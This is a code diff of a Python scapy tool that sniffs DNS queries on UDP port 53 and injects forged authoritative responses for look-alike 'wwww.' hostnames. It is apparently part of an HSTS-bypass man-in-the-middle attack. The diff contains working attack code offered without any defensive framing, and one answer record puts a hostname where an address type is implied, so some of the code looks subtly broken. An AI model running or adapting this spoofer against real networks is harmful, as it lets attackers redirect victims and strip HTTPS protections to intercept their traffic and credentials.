@@ -1,15 +1,12 @@
-from netfilterqueue import NetfilterQueue
 from scapy.all import *
-import dnslib
 
 class DNSResolver:
     def __init__(self, custom_domains):
         self.custom_domains = custom_domains
 
     def process_packet(self, packet):
-        scapy_packet = IP(packet.get_payload())
-        if scapy_packet.haslayer(DNSRR):
-            qname = scapy_packet[DNSQR].qname.decode()
+        if packet.haslayer(DNS) and packet.getlayer(DNS).qd:
+            qname = packet[DNSQR].qname.decode()
             for domain in self.custom_domains:
                 if 'w' + domain in qname:
                     if qname.startswith('wwww.'):
@@ -18,23 +15,25 @@ class DNSResolver:
                         parts = qname.split('.')
                         parts[0] = parts[0][1:]
                         new_qname = '.'.join(parts)
-                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=new_qname)
-                    scapy_packet[DNS].ancount = 1
-                    del scapy_packet[IP].len
-                    del scapy_packet[IP].chksum
-                    del scapy_packet[UDP].len
-                    del scapy_packet[UDP].chksum
-                    packet.set_payload(bytes(scapy_packet))
-                    break
-        packet.accept()
+
+                    # Create the DNS response
+                    dns_response = (
+                        IP(dst=packet[IP].src, src=packet[IP].dst) /
+                        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
+                        DNS(
+                            id=packet[DNS].id,
+                            qd=packet[DNS].qd,
+                            aa=1,
+                            qr=1,
+                            an=DNSRR(rrname=qname, rdata=new_qname)
+                        )
+                    )
+
+                    send(dns_response, verbose=0)
+                    return
 
     def start(self):
-        nfqueue = NetfilterQueue()
-        nfqueue.bind(1, self.process_packet)
-        try:
-            nfqueue.run()
-        except KeyboardInterrupt:
-            pass
+        sniff(filter="udp port 53", prn=self.process_packet)
 
 def parse_hsts_bypass_config(filename):
     with open(filename, 'r') as file:
